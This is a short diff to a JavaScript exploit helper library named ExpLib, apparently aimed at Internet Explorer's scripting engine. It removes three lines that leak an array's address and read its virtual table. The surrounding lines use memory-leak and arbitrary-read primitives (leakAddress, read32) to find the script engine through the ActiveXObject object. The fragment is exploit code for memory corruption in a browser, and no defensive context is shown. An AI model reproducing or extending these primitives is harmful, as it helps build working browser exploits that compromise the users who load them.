@@ -354,11 +354,6 @@ ExpLib = (function() {
 		this.arr2_base = this.base + 0x1000;
 		this.arr2_member_base = this.arr2_base + 0x20;
 
-
-		var target_arr = new Array( 1, 2, 3, 4, 5 );
-		var target_arr_addr =  this.leakAddress(target_arr);
-		var target_arr_vftable = this.read32(target_arr_addr);
-
 		var func_addr = this.leakAddress(ActiveXObject);
 		var script_engine_addr = this.read32(this.read32(func_addr + 0x1c) + 4);
 
